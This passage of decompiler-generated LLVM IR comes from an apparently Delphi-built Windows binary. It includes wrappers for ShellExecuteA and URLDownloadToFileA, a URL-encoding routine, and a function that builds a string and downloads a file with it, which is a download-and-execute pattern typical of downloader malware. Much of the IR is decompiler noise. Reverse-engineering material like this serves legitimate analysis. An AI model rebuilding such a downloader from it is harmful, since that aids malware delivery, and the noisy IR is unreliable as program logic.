  %213 = inttoptr i32 %210 to i8*, !insn.addr !363
  store i8 %212, i8* %213, align 1, !insn.addr !363
  %214 = load i8, i8* %7, align 4, !insn.addr !364
  %215 = load i32, i32* %eax, align 4
  %216 = trunc i32 %215 to i8, !insn.addr !364
  %217 = add i8 %214, %216, !insn.addr !364
  %218 = inttoptr i32 %215 to i8*, !insn.addr !364
  store i8 %217, i8* %218, align 1, !insn.addr !364
  %219 = load i32, i32* %eax, align 4, !insn.addr !364
  ret i32 %219, !insn.addr !364

dec_label_pc_4048d3:                              ; preds = %dec_label_pc_404810
  %220 = mul i32 %6, 808467313, !insn.addr !322
  %221 = trunc i32 %3 to i16, !insn.addr !365
  %222 = inttoptr i32 %220 to i32*, !insn.addr !365
  %223 = load i32, i32* %222, align 4, !insn.addr !365
  call void @__asm_outsd(i16 %221, i32 %223), !insn.addr !365
  %224 = load i8, i8* %7, align 4
  %225 = load i32, i32* %eax, align 4
  %226 = trunc i32 %225 to i8
  %227 = add i8 %224, %226
  %228 = inttoptr i32 %225 to i8*
  store i8 %227, i8* %228, align 1
  %229 = load i8, i8* %7, align 4
  %230 = load i32, i32* %eax, align 4
  %231 = trunc i32 %230 to i8
  %232 = add i8 %229, %231
  %233 = inttoptr i32 %230 to i8*
  store i8 %232, i8* %233, align 1
  %234 = load i8, i8* %7, align 4
  %235 = load i32, i32* %eax, align 4
  %236 = trunc i32 %235 to i8
  %237 = add i8 %234, %236
  %238 = inttoptr i32 %235 to i8*
  store i8 %237, i8* %238, align 1
  %239 = load i8, i8* %7, align 4
  %240 = load i32, i32* %eax, align 4
  %241 = trunc i32 %240 to i8
  %242 = add i8 %239, %241
  %243 = inttoptr i32 %240 to i8*
  store i8 %242, i8* %243, align 1
  %244 = bitcast i32* %ecx to i8*
  %245 = load i8, i8* %244, align 4, !insn.addr !366
  %246 = udiv i32 %3, 256, !insn.addr !366
  %247 = trunc i32 %246 to i8, !insn.addr !366
  %248 = add i8 %245, %247, !insn.addr !366
  %249 = load i32, i32* %ecx, align 4, !insn.addr !366
  %250 = inttoptr i32 %249 to i8*, !insn.addr !366
  store i8 %248, i8* %250, align 1, !insn.addr !366
  %251 = xor i32 %220, %0, !insn.addr !367
  %252 = inttoptr i32 %0 to i32*, !insn.addr !367
  store i32 %251, i32* %252, align 4, !insn.addr !367
  %253 = xor i32 %3, %0, !insn.addr !368
  %254 = inttoptr i32 %3 to i32*, !insn.addr !368
  store i32 %253, i32* %254, align 4, !insn.addr !368
  %255 = load i8, i8* %7, align 4, !insn.addr !369
  %256 = load i32, i32* %eax, align 4
  %257 = trunc i32 %256 to i8, !insn.addr !369
  %258 = add i8 %255, %257, !insn.addr !369
  %259 = inttoptr i32 %256 to i8*, !insn.addr !369
  store i8 %258, i8* %259, align 1, !insn.addr !369
  %260 = load i8, i8* %7, align 4, !insn.addr !370
  %261 = load i32, i32* %eax, align 4
  %262 = trunc i32 %261 to i8, !insn.addr !370
  %263 = add i8 %260, %262, !insn.addr !370
  %264 = inttoptr i32 %261 to i8*, !insn.addr !370
  store i8 %263, i8* %264, align 1, !insn.addr !370
  %265 = load i8, i8* %7, align 4, !insn.addr !371
  %266 = load i32, i32* %eax, align 4
  %267 = trunc i32 %266 to i8, !insn.addr !371
  %268 = add i8 %265, %267, !insn.addr !371
  %269 = inttoptr i32 %266 to i8*, !insn.addr !371
  store i8 %268, i8* %269, align 1, !insn.addr !371
  %270 = load i8, i8* %7, align 4, !insn.addr !372
  %271 = load i32, i32* %eax, align 4
  %272 = trunc i32 %271 to i8, !insn.addr !372
  %273 = add i8 %270, %272, !insn.addr !372
  %274 = inttoptr i32 %271 to i8*, !insn.addr !372
  store i8 %273, i8* %274, align 1, !insn.addr !372
  %275 = load i8, i8* %7, align 4, !insn.addr !373
  %276 = load i32, i32* %eax, align 4
  %277 = trunc i32 %276 to i8, !insn.addr !373
  %278 = add i8 %275, %277, !insn.addr !373
  %279 = inttoptr i32 %276 to i8*, !insn.addr !373
  store i8 %278, i8* %279, align 1, !insn.addr !373
  %280 = load i8, i8* %7, align 4, !insn.addr !374
  %281 = load i32, i32* %eax, align 4
  %282 = trunc i32 %281 to i8, !insn.addr !374
  %283 = add i8 %280, %282, !insn.addr !374
  %284 = inttoptr i32 %281 to i8*, !insn.addr !374
  store i8 %283, i8* %284, align 1, !insn.addr !374
  %285 = load i8, i8* %7, align 4, !insn.addr !375
  %286 = load i32, i32* %eax, align 4
  %287 = trunc i32 %286 to i8, !insn.addr !375
  %288 = add i8 %285, %287, !insn.addr !375
  %289 = inttoptr i32 %286 to i8*, !insn.addr !375
  store i8 %288, i8* %289, align 1, !insn.addr !375
  %290 = load i8, i8* %7, align 4, !insn.addr !376
  %291 = load i32, i32* %eax, align 4
  %292 = trunc i32 %291 to i8, !insn.addr !376
  %293 = add i8 %290, %292, !insn.addr !376
  %294 = inttoptr i32 %291 to i8*, !insn.addr !376
  store i8 %293, i8* %294, align 1, !insn.addr !376
  %295 = load i8, i8* %7, align 4, !insn.addr !377
  %296 = load i32, i32* %eax, align 4
  %297 = trunc i32 %296 to i8, !insn.addr !377
  %298 = add i8 %295, %297, !insn.addr !377
  %299 = inttoptr i32 %296 to i8*, !insn.addr !377
  store i8 %298, i8* %299, align 1, !insn.addr !377
  %300 = load i8, i8* %7, align 4, !insn.addr !378
  %301 = load i32, i32* %eax, align 4
  %302 = trunc i32 %301 to i8, !insn.addr !378
  %303 = add i8 %300, %302, !insn.addr !378
  %304 = inttoptr i32 %301 to i8*, !insn.addr !378
  store i8 %303, i8* %304, align 1, !insn.addr !378
  %305 = load i8, i8* %7, align 4, !insn.addr !379
  %306 = load i32, i32* %eax, align 4
  %307 = trunc i32 %306 to i8, !insn.addr !379
  %308 = add i8 %305, %307, !insn.addr !379
  %309 = inttoptr i32 %306 to i8*, !insn.addr !379
  store i8 %308, i8* %309, align 1, !insn.addr !379
  %310 = load i8, i8* %7, align 4, !insn.addr !380
  %311 = load i32, i32* %eax, align 4
  %312 = trunc i32 %311 to i8, !insn.addr !380
  %313 = add i8 %310, %312, !insn.addr !380
  %314 = inttoptr i32 %311 to i8*, !insn.addr !380
  store i8 %313, i8* %314, align 1, !insn.addr !380
  %315 = load i8, i8* %7, align 4, !insn.addr !381
  %316 = load i32, i32* %eax, align 4
  %317 = trunc i32 %316 to i8, !insn.addr !381
  %318 = add i8 %315, %317, !insn.addr !381
  %319 = inttoptr i32 %316 to i8*, !insn.addr !381
  store i8 %318, i8* %319, align 1, !insn.addr !381
  %320 = load i32, i32* %eax, align 4, !insn.addr !381
  ret i32 %320, !insn.addr !381
}

define i32 @function_404a49() local_unnamed_addr {
dec_label_pc_404a49:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !382
  ret i32 %0, !insn.addr !382
}

define i32 @function_404a4e() local_unnamed_addr {
dec_label_pc_404a4e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !383
}

define i32 @function_404a50(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a50:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !384
}

define i32 @function_404a54() local_unnamed_addr {
dec_label_pc_404a54:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40968c, align 4, !insn.addr !385
  %2 = add i32 %1, -1, !insn.addr !385
  store i32 %2, i32* @global_var_40968c, align 4, !insn.addr !385
  ret i32 %0, !insn.addr !386
}

define i32* @function_404a5c(i32* %hwnd, i8* %lpOperation, i8* %lpFile, i8* %lpParameters, i8* %lpDirectory, i32 %nShowCmd) local_unnamed_addr {
dec_label_pc_404a5c:
  %0 = call i32* @ShellExecuteA(i32* %hwnd, i8* %lpOperation, i8* %lpFile, i8* %lpParameters, i8* %lpDirectory, i32 %nShowCmd), !insn.addr !387
  ret i32* %0, !insn.addr !387
}

define i32 @function_404a64() local_unnamed_addr {
dec_label_pc_404a64:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !388
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !388
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !388
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !389
  %2 = load i32, i32* @global_var_409690, align 4, !insn.addr !390
  %3 = add i32 %2, 1, !insn.addr !390
  store i32 %3, i32* @global_var_409690, align 4, !insn.addr !390
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !391
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !392
  ret i32 0, !insn.addr !393
}

define i32 @function_404a89() local_unnamed_addr {
dec_label_pc_404a89:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !394
  ret i32 %0, !insn.addr !394
}

define i32 @function_404a8e() local_unnamed_addr {
dec_label_pc_404a8e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !395
}

define i32 @function_404a90(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a90:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !396
}

define i32 @function_404a94() local_unnamed_addr {
dec_label_pc_404a94:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409690, align 4, !insn.addr !397
  %2 = add i32 %1, -1, !insn.addr !397
  store i32 %2, i32* @global_var_409690, align 4, !insn.addr !397
  ret i32 %0, !insn.addr !398
}

define i32 @function_404a9c() local_unnamed_addr {
dec_label_pc_404a9c:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !399
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !399
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !399
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !400
  %2 = load i32, i32* @global_var_409694, align 4, !insn.addr !401
  %3 = add i32 %2, 1, !insn.addr !401
  store i32 %3, i32* @global_var_409694, align 4, !insn.addr !401
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !402
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !403
  ret i32 0, !insn.addr !404
}

define i32 @function_404ac1() local_unnamed_addr {
dec_label_pc_404ac1:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !405
  ret i32 %0, !insn.addr !405
}

define i32 @function_404ac6() local_unnamed_addr {
dec_label_pc_404ac6:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !406
}

define i32 @function_404ac8(i32 %arg1) local_unnamed_addr {
dec_label_pc_404ac8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !407
}

define i32 @function_404acc() local_unnamed_addr {
dec_label_pc_404acc:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409694, align 4, !insn.addr !408
  %2 = add i32 %1, -1, !insn.addr !408
  store i32 %2, i32* @global_var_409694, align 4, !insn.addr !408
  ret i32 %0, !insn.addr !409
}

define i32 @function_404ad4() local_unnamed_addr {
dec_label_pc_404ad4:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !410
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !410
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !410
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !411
  %2 = load i32, i32* @global_var_409698, align 4, !insn.addr !412
  %3 = add i32 %2, 1, !insn.addr !412
  store i32 %3, i32* @global_var_409698, align 4, !insn.addr !412
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !413
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !414
  ret i32 0, !insn.addr !415
}

define i32 @function_404af9() local_unnamed_addr {
dec_label_pc_404af9:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !416
  ret i32 %0, !insn.addr !416
}

define i32 @function_404afe() local_unnamed_addr {
dec_label_pc_404afe:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !417
}

define i32 @function_404b00(i32 %arg1) local_unnamed_addr {
dec_label_pc_404b00:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !418
}

define i32 @function_404b04() local_unnamed_addr {
dec_label_pc_404b04:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409698, align 4, !insn.addr !419
  %2 = add i32 %1, -1, !insn.addr !419
  store i32 %2, i32* @global_var_409698, align 4, !insn.addr !419
  ret i32 %0, !insn.addr !420
}

define i32 @function_404b0c(i32* %arg1, i8* %arg2, i8* %arg3, i32 %arg4, i32* %arg5) local_unnamed_addr {
dec_label_pc_404b0c:
  %0 = call i32 @URLDownloadToFileA(i32* %arg1, i8* %arg2, i8* %arg3, i32 %arg4, i32* %arg5), !insn.addr !421
  ret i32 %0, !insn.addr !421
}

define i32 @function_404b14() local_unnamed_addr {
dec_label_pc_404b14:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !422
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !422
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !422
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !423
  %2 = load i32, i32* @global_var_40969c, align 4, !insn.addr !424
  %3 = add i32 %2, 1, !insn.addr !424
  store i32 %3, i32* @global_var_40969c, align 4, !insn.addr !424
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !425
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !426
  ret i32 0, !insn.addr !427
}

define i32 @function_404b39() local_unnamed_addr {
dec_label_pc_404b39:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !428
  ret i32 %0, !insn.addr !428
}

define i32 @function_404b3e() local_unnamed_addr {
dec_label_pc_404b3e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !429
}

define i32 @function_404b40(i32 %arg1) local_unnamed_addr {
dec_label_pc_404b40:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !430
}

define i32 @function_404b44() local_unnamed_addr {
dec_label_pc_404b44:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40969c, align 4, !insn.addr !431
  %2 = add i32 %1, -1, !insn.addr !431
  store i32 %2, i32* @global_var_40969c, align 4, !insn.addr !431
  ret i32 %0, !insn.addr !432
}

define i32 @function_404b4c() local_unnamed_addr {
dec_label_pc_404b4c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8, !insn.addr !433
  %2 = icmp ult i8 %1, 10
  %3 = and i32 %0, 255
  br i1 %2, label %dec_label_pc_404b50, label %dec_label_pc_404b59, !insn.addr !434

dec_label_pc_404b50:                              ; preds = %dec_label_pc_404b4c
  %4 = add nuw nsw i32 %3, 48, !insn.addr !435
  ret i32 %4, !insn.addr !436

dec_label_pc_404b59:                              ; preds = %dec_label_pc_404b4c
  %5 = add nuw nsw i32 %3, 55, !insn.addr !437
  ret i32 %5, !insn.addr !438
}

define i32 @function_404b64() local_unnamed_addr {
dec_label_pc_404b64:
  %esp.2.reg2mem = alloca i32, !insn.addr !439
  %esp.1.reg2mem = alloca i32, !insn.addr !439
  %cf.0.reg2mem = alloca i1, !insn.addr !439
  %esi.0.reg2mem = alloca i32, !insn.addr !439
  %esp.0.reg2mem = alloca i32, !insn.addr !439
  %ebx.0.reg2mem = alloca i32, !insn.addr !439
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !440
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !441
  store i32 %2, i32* %stack_var_-52, align 4, !insn.addr !441
  %3 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !441
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !442
  %4 = call i32 @"@LStrClr"(), !insn.addr !443
  %5 = call i32 @function_4034c8(), !insn.addr !444
  %6 = icmp slt i32 %5, 1
  store i32 %3, i32* %esp.2.reg2mem, !insn.addr !445
  br i1 %6, label %dec_label_pc_404c65, label %dec_label_pc_404bb1.preheader, !insn.addr !445

dec_label_pc_404bb1.preheader:                    ; preds = %dec_label_pc_404b64
  %7 = add i32 %0, -1, !insn.addr !446
  store i32 1, i32* %ebx.0.reg2mem
  store i32 %3, i32* %esp.0.reg2mem
  store i32 %5, i32* %esi.0.reg2mem
  br label %dec_label_pc_404bb1

dec_label_pc_404bb1:                              ; preds = %dec_label_pc_404bb1.preheader, %dec_label_pc_404c5d
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %8 = add i32 %7, %ebx.0.reload, !insn.addr !446
  %9 = inttoptr i32 %8 to i8*, !insn.addr !446
  %10 = load i8, i8* %9, align 1, !insn.addr !446
  %11 = icmp eq i8 %10, 32, !insn.addr !446
  %12 = icmp eq i1 %11, false, !insn.addr !447
  br i1 %12, label %dec_label_pc_404bcc, label %dec_label_pc_404bbb, !insn.addr !447

dec_label_pc_404bbb:                              ; preds = %dec_label_pc_404bb1
  %13 = call i32 @"@LStrCat"(), !insn.addr !448
  store i32 %esp.0.reload, i32* %esp.1.reg2mem, !insn.addr !449
  br label %dec_label_pc_404c5d, !insn.addr !449

dec_label_pc_404bcc:                              ; preds = %dec_label_pc_404bb1
  %14 = icmp ult i8 %10, 32, !insn.addr !450
  br i1 %14, label %dec_label_pc_404bef, label %dec_label_pc_404bd6, !insn.addr !451

dec_label_pc_404bd6:                              ; preds = %dec_label_pc_404bcc
  %15 = add i8 %10, -32, !insn.addr !452
  %16 = icmp ult i8 %15, 95, !insn.addr !453
  %17 = icmp ult i8 %15, 96
  store i1 %16, i1* %cf.0.reg2mem, !insn.addr !454
  br i1 %17, label %dec_label_pc_404be3, label %dec_label_pc_404bed, !insn.addr !454

dec_label_pc_404be3:                              ; preds = %dec_label_pc_404bd6
  %18 = load i32, i32* inttoptr (i32 4213924 to i32*), align 4, !insn.addr !455
  %19 = and i8 %15, 31
  %20 = zext i8 %19 to i32, !insn.addr !455
  %21 = shl i32 1, %20, !insn.addr !455
  %22 = and i32 %18, %21, !insn.addr !455
  %23 = icmp ne i32 %22, 0, !insn.addr !455
  store i1 %23, i1* %cf.0.reg2mem, !insn.addr !455
  br label %dec_label_pc_404bed, !insn.addr !455

dec_label_pc_404bed:                              ; preds = %dec_label_pc_404bd6, %dec_label_pc_404be3
  %cf.0.reload = load i1, i1* %cf.0.reg2mem
  %24 = icmp eq i1 %cf.0.reload, false, !insn.addr !456
  br i1 %24, label %dec_label_pc_404c44, label %dec_label_pc_404bef, !insn.addr !456

dec_label_pc_404bef:                              ; preds = %dec_label_pc_404bed, %dec_label_pc_404bcc
  %25 = and i8 %10, 15
  %26 = zext i8 %25 to i32, !insn.addr !457
  %27 = add i32 %esp.0.reload, -4, !insn.addr !458
  %28 = inttoptr i32 %27 to i32*, !insn.addr !458
  store i32 %26, i32* %28, align 4, !insn.addr !458
  %29 = add i32 %esp.0.reload, -8, !insn.addr !459
  %30 = inttoptr i32 %29 to i32*, !insn.addr !459
  store i32 ptrtoint (i32* @global_var_404cb8 to i32), i32* %30, align 4, !insn.addr !459
  %31 = call i32 @function_404b4c(), !insn.addr !460
  %32 = call i32 @"@LStrFromChar"(), !insn.addr !461
  %33 = add i32 %esp.0.reload, -12, !insn.addr !462
  %34 = inttoptr i32 %33 to i32*, !insn.addr !462
  store i32 0, i32* %34, align 4, !insn.addr !462
  %35 = call i32 @function_404b4c(), !insn.addr !463
  %36 = call i32 @"@LStrFromChar"(), !insn.addr !464
  %37 = add i32 %esp.0.reload, -16, !insn.addr !465
  %38 = inttoptr i32 %37 to i32*, !insn.addr !465
  store i32 0, i32* %38, align 4, !insn.addr !465
  %39 = call i32 @"@LStrCatN"(), !insn.addr !466
  store i32 %37, i32* %esp.1.reg2mem, !insn.addr !467
  br label %dec_label_pc_404c5d, !insn.addr !467

dec_label_pc_404c44:                              ; preds = %dec_label_pc_404bed
  %40 = call i32 @"@LStrFromChar"(), !insn.addr !468
  %41 = call i32 @"@LStrCat"(), !insn.addr !469
  store i32 %esp.0.reload, i32* %esp.1.reg2mem, !insn.addr !469
  br label %dec_label_pc_404c5d, !insn.addr !469

dec_label_pc_404c5d:                              ; preds = %dec_label_pc_404c44, %dec_label_pc_404bef, %dec_label_pc_404bbb
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %42 = add i32 %ebx.0.reload, 1, !insn.addr !470
  %43 = add i32 %esi.0.reload, -1, !insn.addr !471
  %44 = icmp eq i32 %43, 0, !insn.addr !471
  %45 = icmp eq i1 %44, false, !insn.addr !472
  store i32 %42, i32* %ebx.0.reg2mem, !insn.addr !472
  store i32 %esp.1.reload, i32* %esp.0.reg2mem, !insn.addr !472
  store i32 %43, i32* %esi.0.reg2mem, !insn.addr !472
  store i32 %esp.1.reload, i32* %esp.2.reg2mem, !insn.addr !472
  br i1 %45, label %dec_label_pc_404bb1, label %dec_label_pc_404c65, !insn.addr !472

dec_label_pc_404c65:                              ; preds = %dec_label_pc_404c5d, %dec_label_pc_404b64
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %46 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !473
  %47 = load i32, i32* %46, align 4, !insn.addr !473
  call void @__writefsdword(i32 0, i32 %47), !insn.addr !474
  %48 = add i32 %esp.2.reload, 8, !insn.addr !475
  %49 = inttoptr i32 %48 to i32*, !insn.addr !475
  store i32 4213903, i32* %49, align 4, !insn.addr !475
  %50 = call i32 @"@LStrArrayClr"(), !insn.addr !476
  %51 = call i32 @"@LStrClr"(), !insn.addr !477
  ret i32 %51, !insn.addr !478
}

define i32 @function_404c88() local_unnamed_addr {
dec_label_pc_404c88:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !479
  ret i32 %0, !insn.addr !479
}

define i32 @function_404c8d() local_unnamed_addr {
dec_label_pc_404c8d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !480
}

define i32 @function_404c8f(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404c8f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !481
}

define i32 @function_404cb3() local_unnamed_addr {
dec_label_pc_404cb3:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !482
  %2 = inttoptr i32 %0 to i32*, !insn.addr !482
  store i32 %1, i32* %2, align 4, !insn.addr !482
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !483
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !483
  %7 = add i8 %4, %6, !insn.addr !483
  %8 = inttoptr i32 %5 to i8*, !insn.addr !483
  store i8 %7, i8* %8, align 1, !insn.addr !483
  %9 = load i8, i8* inttoptr (i32 1426063360 to i8*), align 16777216, !insn.addr !484
  %10 = load i32, i32* %eax, align 4, !insn.addr !484
  %11 = udiv i32 %10, 256, !insn.addr !484
  %12 = trunc i32 %11 to i8, !insn.addr !484
  %13 = add i8 %9, %12, !insn.addr !484
  store i8 %13, i8* inttoptr (i32 1426063360 to i8*), align 16777216, !insn.addr !484
  %14 = call i32 @function_4036b8(), !insn.addr !485
  %15 = call i32 @__readfsdword(i32 0), !insn.addr !486
  store i32 %15, i32* %stack_var_-24, align 4, !insn.addr !486
  %16 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !486
  call void @__writefsdword(i32 0, i32 %16), !insn.addr !487
  %17 = call i32 @"@LStrCatN"(), !insn.addr !488
  %18 = call i32 @function_4036c8(), !insn.addr !489
  %19 = inttoptr i32 %18 to i32*, !insn.addr !490
  %20 = call i32 @URLDownloadToFileA(i32* %19, i8* null, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !490
  call void @__writefsdword(i32 0, i32 0), !insn.addr !491
  %21 = call i32 @"@LStrArrayClr"(), !insn.addr !492
  ret i32 %21, !insn.addr !493
}

define i32 @function_404cbc() local_unnamed_addr {
dec_label_pc_404cbc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0
}

define i32 @function_404d2a() local_unnamed_addr {
dec_label_pc_404d2a:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !494
  ret i32 %0, !insn.addr !494
}

define i32 @function_404d2f() local_unnamed_addr {
dec_label_pc_404d2f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !495
}

define i32 @function_404d31(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_404d31:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !496
}

define i32 @function_404d3b() local_unnamed_addr {
dec_label_pc_404d3b:
  %edi = alloca i32, align 4
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %4 = add i32 %3, 1, !insn.addr !497
  %5 = inttoptr i32 %3 to i32*, !insn.addr !497
  store i32 %4, i32* %5, align 4, !insn.addr !497
  %6 = bitcast i32* %eax to i8*
  %7 = load i8, i8* %6, align 4, !insn.addr !498
  %8 = load i32, i32* %eax, align 4
  %9 = trunc i32 %8 to i8, !insn.addr !498
  %10 = add i8 %7, %9, !insn.addr !498
  %11 = inttoptr i32 %8 to i8*, !insn.addr !498
  store i8 %10, i8* %11, align 1, !insn.addr !498
  %12 = bitcast i32* %edi to i8*
  %13 = load i8, i8* %12, align 4, !insn.addr !499
  %14 = udiv i32 %1, 256, !insn.addr !499
  %15 = trunc i32 %14 to i8, !insn.addr !499
  %16 = add i8 %13, %15, !insn.addr !499
  %17 = load i32, i32* %edi, align 4, !insn.addr !499
  %18 = inttoptr i32 %17 to i8*, !insn.addr !499
  store i8 %16, i8* %18, align 1, !insn.addr !499
  %19 = load i8, i8* %6, align 4, !insn.addr !500
  %20 = load i32, i32* %eax, align 4
  %21 = trunc i32 %20 to i8, !insn.addr !500
  %22 = add i8 %19, %21, !insn.addr !500
  %23 = inttoptr i32 %20 to i8*, !insn.addr !500
  store i8 %22, i8* %23, align 1, !insn.addr !500
  %24 = add i32 %0, -117, !insn.addr !501
  %25 = inttoptr i32 %24 to i8*, !insn.addr !501
  %26 = load i8, i8* %25, align 1, !insn.addr !501
  %27 = trunc i32 %2 to i8, !insn.addr !501
  %28 = add i8 %26, %27, !insn.addr !501
  store i8 %28, i8* %25, align 1, !insn.addr !501
  %29 = trunc i32 %2 to i16, !insn.addr !502
  %30 = call i8 @__asm_in(i16 %29), !insn.addr !502
  %31 = call i32 @__readfsdword(i32 0), !insn.addr !503
  store i32 %31, i32* %stack_var_-12, align 4, !insn.addr !503
  %32 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !503
  call void @__writefsdword(i32 0, i32 %32), !insn.addr !504
  %33 = load i32, i32* @global_var_4096a0, align 4, !insn.addr !505
  %34 = add i32 %33, 1, !insn.addr !505
  store i32 %34, i32* @global_var_4096a0, align 4, !insn.addr !505
  %35 = load i32, i32* %stack_var_-12, align 4, !insn.addr !506
  call void @__writefsdword(i32 0, i32 %35), !insn.addr !507
  ret i32 0, !insn.addr !508
}

define i32 @function_404d69() local_unnamed_addr {
dec_label_pc_404d69:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !509
  ret i32 %0, !insn.addr !509
}

define i32 @function_404d6e() local_unnamed_addr {
dec_label_pc_404d6e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !510
}

define i32 @function_404d70(i32 %arg1) local_unnamed_addr {
dec_label_pc_404d70:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !511
}

define i32 @function_404d74() local_unnamed_addr {
dec_label_pc_404d74:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a0, align 4, !insn.addr !512
  %2 = add i32 %1, -1, !insn.addr !512
  store i32 %2, i32* @global_var_4096a0, align 4, !insn.addr !512
  ret i32 %0, !insn.addr !513
}

define i32 @function_404d7f(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404d7f:
  %storemerge.reg2mem = alloca i32, !insn.addr !514
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %4 = add i32 %3, 1, !insn.addr !514
  %5 = inttoptr i32 %3 to i32*, !insn.addr !514
  store i32 %4, i32* %5, align 4, !insn.addr !514
  %6 = bitcast i32* %eax to i8*
  %7 = load i8, i8* %6, align 4, !insn.addr !515
  %8 = load i32, i32* %eax, align 4
  %9 = trunc i32 %8 to i8, !insn.addr !515
  %10 = add i8 %7, %9, !insn.addr !515
  %11 = inttoptr i32 %8 to i8*, !insn.addr !515
  store i8 %10, i8* %11, align 1, !insn.addr !515
  %12 = load i32, i32* %eax, align 4, !insn.addr !516
  store i32 %arg1, i32* %eax, align 4, !insn.addr !517
  %13 = add i32 %12, 99, !insn.addr !518
  %14 = inttoptr i32 %13 to i64*, !insn.addr !518
